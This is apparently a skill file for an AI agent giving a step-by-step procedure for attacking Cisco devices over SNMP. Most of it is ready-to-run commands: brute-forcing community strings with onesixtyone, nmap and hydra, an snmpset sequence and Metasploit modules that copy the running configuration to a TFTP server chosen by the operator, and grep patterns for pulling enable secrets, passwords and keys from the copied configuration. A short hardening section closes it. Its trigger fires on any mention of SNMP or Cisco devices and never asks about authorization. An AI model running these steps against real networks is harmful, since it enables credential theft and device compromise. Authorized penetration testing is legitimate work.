---
name: cisco-snmp-pentest
description: Pentest Cisco network devices using SNMP vulnerabilities. Use this skill whenever the user mentions SNMP, Cisco devices, network pentesting, community strings, or needs to enumerate/dump configurations from network equipment. Trigger for any task involving SNMP brute-forcing, config extraction, or Cisco device reconnaissance.
---

# Cisco SNMP Pentesting

This skill helps you enumerate, brute-force, and exploit SNMP on Cisco network devices. SNMP (Simple Network Management Protocol) is a common attack vector in network pentesting.

## Quick Start

```bash
# Scan for SNMP on a target
nmap -sU -p161,162 <target>

# Brute-force community strings
onesixtyone -c wordlist.txt -i targets.txt

# Enumerate device info
nmap -sU -p161 --script snmp-interfaces,snmp-sysdescr <target>
```

## Understanding SNMP

SNMP operates over **UDP ports 161** (queries) and **162** (traps). It uses **community strings** as plaintext authentication:

- **Read-Only (RO)**: Can query device information
- **Read-Write (RW)**: Can modify configurations (critical for exploitation)

Common default community strings to try:
- `public` (RO default)
- `private` (RW default)
- `cisco`, `admin`, `manager`, `test`, `default`

## Phase 1: SNMP Enumeration

### Check if SNMP is running

```bash
# Basic port scan
nmap -sU -p161,162 <target>

# Check SNMP version and community
nmap -sU -p161 --script snmp-sysdescr,snmp-interfaces <target>
```

### Enumerate with known community string

```bash
# Get system information
snmpwalk -v2c -c <community> <target> .1.3.6.1.2.1.1

# Get interface information
snmpwalk -v2c -c <community> <target> .1.3.6.1.2.1.2

# Get routing table
snmpwalk -v2c -c <community> <target> .1.3.6.1.2.1.4

# Get ARP table
snmpwalk -v2c -c <community> <target> .1.3.6.1.2.1.3
```

### Use Metasploit for enumeration

```bash
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS <target>
set COMMUNITY <community-string>
run
```

This collects:
- Device inventory
- VLAN information
- Interface descriptions
- ARP tables
- Routing information

## Phase 2: Brute-Force Community Strings

### Using onesixtyone (recommended)

```bash
# Basic brute-force
onesixtyone -c wordlist.txt -i targets.txt

# With output file
onesixtyone -c wordlist.txt -i targets.txt -o results.txt
```

**Wordlist sources:**
- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/wordlists/onesixtyone.txt`
- Custom wordlists with common Cisco strings

### Using Nmap NSE script

```bash
# Brute-force with Nmap
nmap -sU -p161 --script snmp-brute \
     --script-args brute.community=wordlist.txt <target>

# Test specific community strings
nmap -sU -p161 --script snmp-brute \
     --script-args brute.community="public,private,cisco,admin" <target>
```

### Using Hydra

```bash
hydra -P wordlist.txt -s 161 <target> snmp
```

## Phase 3: Dump Cisco Configurations

Once you have an **RW community string**, you can extract the device configuration without CLI access.

### Method 1: Nmap snmp-ios-config script

```bash
nmap -sU -p161 --script snmp-ios-config \
     --script-args creds.snmp=<rw-community> <target>
```

This automatically:
1. Sets up a TFTP server
2. Triggers the config copy via CISCO-CONFIG-COPY-MIB
3. Prints the configuration to stdout

### Method 2: Manual snmpset sequence

Use the bundled script for this complex operation:

```bash
# Run the config dump script
./scripts/dump_cisco_config.sh <target> <rw-community> <tftp-server-ip> <filename>
```

**Manual approach** (if script unavailable):

```bash
# Copy running-config to TFTP server
snmpset -v2c -c <community> <target> \
  1.3.6.1.4.1.9.9.96.1.1.1.1.2.<rowid> i 1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.<rowid> i 4 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.<rowid> i 1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.5.<rowid> a <tftp-ip> \
  1.3.6.1.4.1.9.9.96.1.1.1.1.6.<rowid> s "<filename>" \
  1.3.6.1.4.1.9.9.96.1.1.1.1.14.<rowid> i 4
```

**Important:** Row IDs are one-shot. Reuse within 5 minutes causes `inconsistentValue` errors. Use a new row ID for each attempt.

### Method 3: Metasploit cisco_config_tftp

```bash
use auxiliary/admin/cisco/cisco_config_tftp
set RHOSTS <target>
set COMMUNITY <rw-community>
set TFTPDIR /tmp/tftp
run
```

## Phase 4: Analyze Extracted Config

Look for:

```bash
# Find enable secrets
grep -i "enable secret" config.txt

# Find usernames and passwords
grep -i "username.*secret\|username.*password" config.txt

# Find SNMP community strings
grep -i "snmp-server community" config.txt

# Find crypto keys
grep -i "crypto.*key\|password" config.txt

# Find VLAN configurations
grep -i "vlan\|interface" config.txt
```

## Recent Cisco SNMP Vulnerabilities

| CVE | Year | Impact | Notes |
|-----|------|--------|-------|
| CVE-2025-20174 | 2025 | DoS (device reload) | Crafted SNMP packet on IOS/IOS-XE |
| CVE-2024-20373 | 2024 | ACL bypass | Extended ACLs silently fail, allowing unauthorized SNMP polling |
| Unassigned | 2025 | SNMPv3 restriction bypass | Valid v3 user can poll from denied addresses |

**Exploitation typically requires:**
- Known community string or v3 credentials
- Network access to the device
- Specific IOS/IOS-XE versions

## Hardening Recommendations

If you're doing defensive work:

1. **Upgrade IOS/IOS-XE** to patched versions
2. **Use SNMPv3** with authentication and privacy:
   ```
   snmp-server group SECURE v3 priv
   snmp-server user monitor SECURE v3 auth sha <pass> priv aes 256 <pass>
   ```
3. **Restrict with standard ACLs** (not extended named ACLs - CVE-2024-20373):
   ```
   access-list 99 permit <management-subnet>
   snmp-server community <string> RO 99
   ```
4. **Disable RW communities** or limit with views:
   ```
   snmp-server community <string> RW 99 view SysView
   ```
5. **Monitor for anomalies:**
   - UDP/161 traffic spikes
   - Unexpected source IPs
   - `CISCO-CONFIG-MAN-MIB::ccmHistoryEventConfigSource` events

## Common Pitfalls

- **Row ID reuse**: Each snmpset sequence needs a unique row ID
- **TFTP server**: Must be accessible from the target device
- **Firewall rules**: Ensure UDP 161/162 and TFTP (69) are open
- **Timeout**: SNMP operations can timeout on slow networks
- **Version mismatch**: Verify SNMP version (v1, v2c, v3) before attempting operations

## Tool Dependencies

- `onesixtyone` - Community string brute-forcing
- `snmpwalk`, `snmpset` - SNMP operations (net-snmp package)
- `nmap` - Port scanning and NSE scripts
- `hydra` - Alternative brute-forcing
- `tftpd` or `atftpd` - TFTP server for config dumps
- `metasploit` - Optional, for advanced operations
